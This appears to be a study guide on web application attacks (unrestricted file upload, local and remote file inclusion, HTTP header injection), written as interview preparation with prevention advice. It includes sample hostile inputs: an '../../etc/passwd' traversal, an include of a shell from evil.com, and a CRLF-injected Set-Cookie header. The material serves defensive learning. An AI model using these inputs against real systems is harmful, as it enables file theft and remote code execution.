BLOCK C — Web Application Exploitation

Objective: Learn how attackers exploit weaknesses in web applications after reaching the application.

Topics:

1. Unrestricted File Upload


2. File Inclusion Vulnerabilities (LFI/RFI)


3. Header Injection




---

1. Unrestricted File Upload

What is it?

Many applications allow users to upload files:

Profile picture

Resume

PDF

Documents


If the server doesn't properly validate uploads, an attacker can upload malicious files.


---

Example

Normal user uploads:

resume.pdf

Attacker uploads:

shell.php

If the server executes PHP files,

the attacker can run commands on the server.

This is called a Web Shell.


---

Attack Flow

Attacker

↓

Uploads shell.php

↓

Server stores file

↓

Attacker visits

website.com/uploads/shell.php

↓

Server executes PHP

↓

Remote Code Execution (RCE)


---

Why is it dangerous?

The attacker may gain:

Server access

Database access

Sensitive files

Command execution

Full system compromise



---

Why checking file extension is NOT enough

Bad validation:

Allowed:

.jpg
.png
.pdf

Attacker uploads:

image.php.jpg

or

shell.pHp

or changes the MIME type.

Extension checking alone can be bypassed.


---

Better validation

A secure application checks:

✔ File extension

✔ MIME type

✔ File signature (magic bytes)

✔ Virus scanning

✔ File size

✔ Upload location


---

Why validate file CONTENT instead of extension?

This is exactly the question your manager likes.

Because:

Extensions can be renamed.

Actual file contents cannot easily be disguised.

Example

shell.php

↓

Rename

↓

cat.jpg

Extension says JPG.

Content says PHP.

Server should inspect the actual bytes.


---

Why store uploads outside the web root?

Web Root:

www.example.com/uploads/

If uploaded here,

the attacker may execute:

shell.php

Outside Web Root:

/var/uploads/

Cannot be accessed directly through the browser.

Application reads the file safely.


---

Manager Answer

> We store uploads outside the web root to prevent uploaded files from being directly executed through the web server.




---

2. File Inclusion Vulnerabilities

Applications often load files dynamically.

Example

?page=home

Server

include(home.php)


---

If input isn't validated:

?page=../../etc/passwd

Server loads:

/etc/passwd

This is Local File Inclusion (LFI).


---

Local File Inclusion (LFI)

Reads files already present on the server.

Examples

/etc/passwd

config.php

logs

keys


---

Remote File Inclusion (RFI)

Instead of loading local files,

the application loads files from another server.

Example

include(

http://evil.com/shell.php

)

The attacker controls:

evil.com

Server downloads and executes it.

Very dangerous.


---

LFI vs RFI

LFI	RFI

Reads local files	Loads remote files
Uses server files	Uses attacker files
May leak data	Often leads to Remote Code Execution



---

Why is File Inclusion dangerous?

Because attackers can:

Read configuration

Read passwords

Leak API keys

Execute code

Gain server access



---

Prevention

Never directly trust user input.

Instead:

Allowed Pages

↓

Home

↓

Profile

↓

About

Use a whitelist.


---

Manager Answer

Why use whitelists?

Because attackers cannot request arbitrary files if only predefined files are allowed.


---

3. Header Injection

Every HTTP response contains headers.

Example

HTTP/1.1 200 OK

Content-Type

Set-Cookie

Location

Cache-Control

If user input is inserted into headers without validation,

attackers can inject new headers.


---

Example

Suppose

Location:

/welcome?name=Suresh

Attacker submits

Suresh

Set-Cookie:

admin=true

Now the response becomes corrupted.


---

Response Splitting

Attacker injects

CRLF

(Carriage Return + Line Feed)

Creates another response header.

Possible consequences:

Cookie injection

Cache poisoning

Redirects

XSS



---

Why sanitize headers?

Headers control browser behavior.

If attackers manipulate them,

they can:

Steal sessions

Redirect users

Poison caches

Bypass security controls



---

Manager Answer

Why sanitize HTTP headers?

Because HTTP headers influence browser behavior, and unvalidated input can allow attackers to inject malicious headers or split responses.


